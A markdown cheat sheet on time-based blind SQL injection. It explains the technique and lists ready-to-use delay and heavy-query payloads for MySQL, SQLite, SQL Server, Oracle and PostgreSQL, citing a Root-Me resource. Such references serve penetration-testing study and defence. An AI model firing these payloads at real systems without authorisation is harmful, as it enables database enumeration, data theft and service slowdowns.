# Time based SQLi 

This happens when nothing is visible by the request but the field is still vulnerable.
There is two time based attack types :
- Sleep functions such as `MySQL SLEEP(INT)`
- **Heavy queries** : CPU Intensive functions such as `SQLite RANDOMBLOB(INT)`

If the request come back after a given time, it worked.

# Conditions

**MySQL**
```sql
-- Condition
IF(condition, when_true, when_false)
-- Substrings
IF(SUBSTRING(version(),1,1)=5,SLEEP(10),null)
-- lengths
IF (length(database ()) =1, SLEEP (5), 1)
```

**SQL Server**
```sql
IF condition when_true [ELSE when_false]
```

**Oracle**
```sql
IF condition THEN when_true [ELSE when_false] END IF
```

# Payloads

**MySQL Functions**
```sql
1-SLEEP(15)
1-BENCHMARK(100000000, rand())

SELECT SLEEP(5);
SELECT SLEEP(5),null,null;
AND SLEEP(5)
BENCHMARK(n,expr) -- Executes the specified expression n times
```

**MySQL Heavy queries**
```sql
-- This query can be fastened by using `tables` table
-- And slowed by using `columns` table
-- Around 17s
select count(*) from information_schema.columns, information_schema.tables T1, information_schema.tables T2;
```

**SQLite**
```sql
SELECT UPPER(HEX(RANDOMBLOB(100000000))); -- like sleep(~5)
```

**MS SQL Server**
```sql
1' waitfor delay '00:00:10'--

WAIT FOR DELAY 'hh:mm:ss'
WAIT FOR TIME 'hh:mm:ss'
```

**Oracle**
```sql
BEGIN DBMS_LOCK.SLEEP(15); END;
```

**PostgreSQL**
```sql
1' AND pg_sleep(5)
```

# Resources

- [Root-Me Repository](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Time%20based%20blind%20SQL%20Injection%20using%20heavy%20queries.pdf?_gl=1*1m6goaw*_ga*MTYxMDQ3MzgyMC4xNzE4MzU2NTIx*_ga_SRYSKX09J7*MTcyMDYzMzIyMS40NC4xLjE3MjA2MzQ1OTMuMC4wLjA)
